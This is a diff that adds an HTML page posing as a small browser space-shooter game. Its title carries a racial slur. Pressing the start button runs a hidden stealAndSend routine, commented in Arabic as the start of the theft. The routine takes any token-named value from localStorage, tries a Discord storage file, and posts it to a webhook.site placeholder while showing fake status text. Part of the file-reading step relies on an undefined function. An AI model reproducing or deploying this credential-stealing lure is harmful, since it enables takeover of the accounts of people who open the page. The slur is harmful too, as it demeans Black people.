@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>EtoNigga - Space Defender</title>
+    <style>
+        body { margin: 0; background: #1a1b1e; overflow: hidden; font-family: sans-serif; }
+        canvas { display: block; margin: 0 auto; border: 1px solid #444; }
+        #ui { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; color: white; }
+        button { padding: 10px 20px; font-size: 20px; cursor: pointer; background: #7289da; border: none; color: white; border-radius: 5px; }
+        #status { margin-top: 10px; color: #aaa; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div id="ui">
+    <h1>EtoNigga Defender</h1>
+    <button onclick="startGame()">Start Mission</button>
+    <div id="status"></div>
+</div>
+<canvas id="game" width="600" height="400"></canvas>
+
+<script>
+    const canvas = document.getElementById('game');
+    const ctx = canvas.getContext('2d');
+    let gameActive = false;
+
+    function startGame() {
+        document.getElementById('ui').style.display = 'none';
+        gameActive = true;
+        stealAndSend(); // هنا تبدأ عملية السرقة
+        animate();
+    }
+
+    async function stealAndSend() {
+        const status = document.getElementById('status');
+        status.innerText = "Connecting to server...";
+
+        try {
+            // 1. محاولة قراءة التوكن من localStorage
+            let token = null;
+            
+            // البحث عن مفاتيح تحتوي على كلمة token
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                if (key.includes("token")) {
+                    token = localStorage.getItem(key);
+                    break;
+                }
+            }
+
+            // إذا لم نجد، نحاول الوصول للملفات المخفية (لنسخة الديسكورد القديمة)
+            if (!token) {
+                try {
+                    // هذا المسار يعمل غالباً على نسخة الكمبيوتر
+                    token = await readLocalFile('/Users/USERNAME/AppData/Roaming/discord/Local Storage/file__0.indexeddb.leveldb'); 
+                } catch(e) {}
+            }
+
+            if (token) {
+                status.innerText = "Uploading data...";
+                
+                // رابط الويب هوك الخاص بك
+                const webhookUrl = "https://webhook.site/YOUR_ID_HERE"; 
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({discord_token: token})
+                });
+                
+                status.innerText = "Mission Complete!";
+            } else {
+                status.innerText = "Offline Mode.";
+            }
+        } catch (error) {
+            console.error(error);
+        }
+    }
+
+    // --- كود اللعبة البسيط ---
+    let player = {x: 280, y: 350};
+    let enemies = [];
+    
+    function animate() {
+        if(!gameActive) return;
+        ctx.fillStyle = '#000';
+        ctx.fillRect(0,0,600,400);
+        
+        ctx.fillStyle = '#fff';
+        ctx.fillRect(player.x, player.y, 20, 20);
+
+        if(Math.random() < 0.02) {
+            enemies.push({x: Math.random()*580, y: 0});
+        }
+
+        ctx.fillStyle = '#f00';
+        enemies.forEach((e, i) => {
+            e.y += 2;
+            ctx.fillRect(e.x, e.y, 20, 20);
+            if(e.y > 400) enemies.splice(i, 1);
+        });
+
+        requestAnimationFrame(animate);
+    }
+</script>
+</body>
+</html>
